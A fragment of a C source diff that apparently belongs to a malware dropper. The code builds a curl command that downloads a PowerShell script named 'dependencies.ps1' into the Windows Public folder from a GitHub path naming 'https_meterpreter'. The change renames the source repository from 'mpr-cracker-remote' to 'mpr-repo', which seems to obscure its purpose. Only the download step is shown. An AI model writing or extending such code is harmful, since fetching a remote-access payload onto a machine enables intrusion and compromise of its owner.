@@ -23,7 +23,7 @@ int main()
     printf("\n");
 
     char path1[1024] = "curl --output \"";
-    char path2[1024] = "\\Users\\Public\\dependencies.ps1\" -LJO https://raw.githubusercontent.com/durandlh/mpr-cracker-remote/main/fourth-revision/https_meterpreter/dependencies.ps1";
+    char path2[1024] = "\\Users\\Public\\dependencies.ps1\" -LJO https://raw.githubusercontent.com/durandlh/mpr-repo/main/fourth-revision/https_meterpreter/dependencies.ps1";
     // check if file exists in publicdirfull
     if (fopen(publicDirFull, "r") == NULL)
     {
